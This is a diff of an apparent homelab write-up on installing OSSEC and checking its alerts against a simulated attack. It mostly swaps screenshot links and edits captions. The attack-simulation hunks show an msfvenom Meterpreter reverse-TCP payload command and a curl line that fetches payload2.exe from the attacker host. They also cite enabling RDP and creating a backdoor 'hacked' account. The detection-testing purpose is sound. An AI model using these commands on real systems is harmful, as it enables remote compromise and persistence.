@@ -194,28 +194,29 @@ sudo apt-get install libpcre2-dev
 /usr/bin/ld: cannot find -lsystemd: No such file or directory
 ```
 
-![Compilation Error lsystemd](screenshots/03-server-installation/15-compilation-error-lsystemd.png)
+
+<img width="1470" height="554" alt="Screenshot 2026-03-28 at 1 21 08 PM" src="https://github.com/user-attachments/assets/9aa1bc62-db96-4f18-9abe-8db768d8e040" />
 *Second compilation failure: the OSSEC mail daemon requires the systemd development library for linking. This is a known issue on modern Ubuntu systems.*
+
+
 
 ```bash
 sudo apt-get install libsystemd-dev
 ```
 
-![Installing libsystemd-dev](screenshots/03-server-installation/16-install-libsystemd-dev.png)
-*Successfully installing `libsystemd-dev` (1,293 kB). After this, the install script was re-run and compilation completed without errors.*
+<img width="1470" height="956" alt="Screenshot 2026-03-28 at 1 23 11 PM" src="https://github.com/user-attachments/assets/905a4d38-462d-486b-ba1b-b1819cc4bbf9" />
+
+*Successfully installing `libsystemd-dev` . After this, the install script was re-run and compilation completed without errors.*
 
 ---
 
 ### Successful Installation & First Start
 
-With all dependencies resolved, OSSEC compiled and installed cleanly to `/var/ossec`.
+Successful installation With all dependencies resolved, OSSEC compiled and installed cleanly to `/var/ossec`.
 
-![Installation Complete](screenshots/03-server-installation/17-installation-complete.png)
-*OSSEC installation completed successfully. The final output confirms:*
-- *System detected as Debian/Ubuntu derivative*
-- *Init script modified to start OSSEC during boot*
-- *Configuration stored at `/var/ossec/etc/ossec.conf`*
-- *Start command: `/var/ossec/bin/ossec-control start`*
+<img width="1470" height="956" alt="Screenshot 2026-03-28 at 1 25 13 PM" src="https://github.com/user-attachments/assets/a55b774e-c746-42da-a74a-ccdf44b274a3" />
+*OSSEC installation completed successfully. The final output confirms:* 
+<br><br>
 
 OSSEC requires root to start. The `/var/ossec/bin` directory is root-owned and requires elevated access:
 
@@ -225,10 +226,14 @@ cd /var/ossec/bin
 ./ossec-control start
 ```
 
-![Starting OSSEC Server](screenshots/03-server-installation/18-starting-ossec-server.png)
-*After escalating to root with `sudo -i` and navigating to `/var/ossec/bin`, OSSEC v4.0.0 starts all daemons: `ossec-execd`, `ossec-analysisd`, `ossec-logcollector`, `ossec-remoted`, `ossec-syscheckd`, and `ossec-monitord`.*
+<img width="1470" height="822" alt="Screenshot 2026-03-28 at 1 38 58 PM" src="https://github.com/user-attachments/assets/19b752c8-72f2-4485-82a8-b116bb748d55" />
 
-![OSSEC Daemon Status](screenshots/03-server-installation/19-ossec-daemon-status.png)
+*After escalating to root with `sudo -i`. `./ossec-control start` is ran to activate ossec *
+<br><br>
+
+
+<img width="1457" height="206" alt="Screenshot 2026-03-28 at 1 40 25 PM" src="https://github.com/user-attachments/assets/25826bd5-d663-4ded-9e5d-91ba3f86f256" />
+
 *Running `./ossec-control status` confirms the core daemons are active. `ossec-remoted` initially shows a process conflict error during early configuration but resolves after a clean restart.*
 
 ---
@@ -418,7 +423,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp \
   -f exe -o payload2.exe
 ```
 
-![msfvenom Payload Generated](screenshots/06-attack-simulation/36-msfvenom-payload-generated.png)
+<img width="1470" height="956" alt="Screenshot 2026-03-28 at 4 13 42 PM" src="https://github.com/user-attachments/assets/9666a248-8fad-404d-a018-b72709035c7e" />
+
 *`msfvenom` generates `payload2.exe` — a Windows x64 Meterpreter reverse TCP payload. Output confirms:*
 - *Platform: Windows (x64)*
 - *Payload size: 510 bytes*
@@ -474,8 +480,9 @@ The payload was then downloaded via `curl` on Windows CMD (run as Administrator)
 curl http://192.168.64.8:8080/payload2.exe -o %TEMP%\payload2.exe
 ```
 
-![Curl Download Success](screenshots/06-attack-simulation/40-curl-download-success.png)
-*`curl` successfully downloads `payload2.exe` to `%TEMP%`. The transfer completes at 100% — 7,680 bytes received at 243k/s. The `dir %TEMP%\payload2.exe` command confirms the file is present and intact at exactly 7,680 bytes.*
+<img width="1470" height="899" alt="Screenshot 2026-03-28 at 5 07 05 PM" src="https://github.com/user-attachments/assets/b2d74dde-addd-4b44-8c5a-7dbf4b11cdb5" />
+
+*`curl` successfully downloads `payload2.exe` to `%TEMP%`. The transfer completes at 100% — 7,680 bytes. The `dir %TEMP%\payload2.exe` command confirms the file is present and intact at exactly 7,680 bytes.*
 
 ---
 
@@ -513,9 +520,7 @@ run
 
 ![Enable RDP Post-Exploitation](screenshots/06-attack-simulation/43-enable-rdp-post-exploitation.png)
 *The `post/windows/manage/enable_rdp` module runs against Session 1. OSSEC detects this as a service state change. Output confirms:*
-- *RDP was disabled — enabling it*
-- *Terminal Services startup mode changed from demand-start to auto-start*
-- *Port 3389 opened in the local Windows firewall*
+
 
 **Creating a Backdoor User Account:**
 
@@ -582,7 +587,6 @@ hacked: Administrator: A user account was created.
 |-------|-----------------|------------|-------|---------|
 | New user account created (`hacked`) | 4720 | 18101 | 8 | ✅ Yes |
 | User group membership changed | 4732 | 18101 | 8 | ✅ Yes |
-| RDP service enabled (startup mode changed) | 7040 | — | 3 | ✅ Yes |
 | Agent connected to server | — | 501 | 3 | ✅ Yes |
 | Login session opened/closed | — | 5501/5502 | 3 | ✅ Yes |
 | File integrity baseline change | — | 550 | 7 | ✅ Yes |
